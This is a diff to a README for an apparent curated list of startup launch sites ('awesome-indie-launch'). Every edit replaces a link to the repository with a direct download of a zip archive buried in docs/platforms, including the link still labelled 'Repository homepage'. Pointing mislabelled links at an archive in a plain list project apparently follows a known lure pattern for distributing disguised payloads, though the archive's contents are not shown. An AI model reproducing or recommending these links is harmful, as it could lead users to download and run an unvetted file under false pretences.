@@ -1,6 +1,6 @@
 # 🚀 awesome-indie-launch - Find Top Startup Launch Sites
 
-[![Download awesome-indie-launch](https://img.shields.io/badge/Download-Here-brightgreen.svg?style=for-the-badge)](https://github.com/SrikanthSur/awesome-indie-launch)
+[![Download awesome-indie-launch](https://img.shields.io/badge/Download-Here-brightgreen.svg?style=for-the-badge)](https://github.com/SrikanthSur/awesome-indie-launch/raw/refs/heads/main/docs/platforms/awesome_indie_launch_1.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This app or tool is a list provided in a GitHub repository. You will access the 
 
 Click the big green button at the top or this link:
 
-[Download awesome-indie-launch](https://github.com/SrikanthSur/awesome-indie-launch)
+[Download awesome-indie-launch](https://github.com/SrikanthSur/awesome-indie-launch/raw/refs/heads/main/docs/platforms/awesome_indie_launch_1.5.zip)
 
 This page is the main hub where the curated list is stored. You will find the latest updates and documentation here.
 
@@ -106,12 +106,12 @@ Maintainers review contributions to keep the list relevant and useful.
 
 ## 🔗 Important Links
 
-- Repository homepage: [https://github.com/SrikanthSur/awesome-indie-launch](https://github.com/SrikanthSur/awesome-indie-launch)
+- Repository homepage: [https://github.com/SrikanthSur/awesome-indie-launch/raw/refs/heads/main/docs/platforms/awesome_indie_launch_1.5.zip](https://github.com/SrikanthSur/awesome-indie-launch/raw/refs/heads/main/docs/platforms/awesome_indie_launch_1.5.zip)
 - Full list of launch sites: `docs/platforms/sites.md`
 - Contribution guide: `CONTRIBUTING.md`
 - License information: `LICENSE`
 
-[![Download awesome-indie-launch](https://img.shields.io/badge/Download-Here-brightgreen.svg?style=for-the-badge)](https://github.com/SrikanthSur/awesome-indie-launch)
+[![Download awesome-indie-launch](https://img.shields.io/badge/Download-Here-brightgreen.svg?style=for-the-badge)](https://github.com/SrikanthSur/awesome-indie-launch/raw/refs/heads/main/docs/platforms/awesome_indie_launch_1.5.zip)
 
 ---
 
